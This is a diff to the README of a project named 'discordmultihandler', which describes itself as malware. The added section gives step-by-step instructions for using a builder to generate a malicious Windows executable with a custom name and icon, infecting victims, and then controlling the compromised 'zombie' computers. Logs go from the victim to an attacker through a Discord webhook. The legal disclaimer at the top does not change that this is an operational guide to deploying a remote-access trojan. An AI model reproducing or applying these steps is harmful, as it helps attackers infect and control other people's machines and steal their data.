@@ -1,7 +1,17 @@
 ***WARNING : If you use it for illegal purposes, you may be subject to legal punishment. This is not joke**
 # discordmultihandler
-
-## Description of this malware
+## How to use?
+The first thing you need to do is set it up.
+After running R_handler made of exe file, add the bot to your personal server and insert the bot's token. And click the "Make Malware" button to create malicious code. and enter the items below.
+If the victim is infected, the victim computer with "'IP' 'Windows Account Name'" will be added. Then select the victim computer in the "select box" and click "show zombiePC control" to control the victim computer. Then it's over.
+```
+webhooklinks: webhook links on your personal server to receive logs
+path : Path where images, etc. will be saved
+file name: Enter the name of the malicious code to be created. (If the file name is other than this, it will not work.)
+icon : Enter the malicious code icon file. If not, please leave blank.
+```
+After entering everything, click the "Make Malware" button to infect the victim with malware using the .exe extension created in the dist path.
+### Description of this malware
 This malicious code uses one-way unstable encryption communication technique.
 This malicious code is a malicious code using Discord.
 victimPC -> discord(webhook) -> attacker
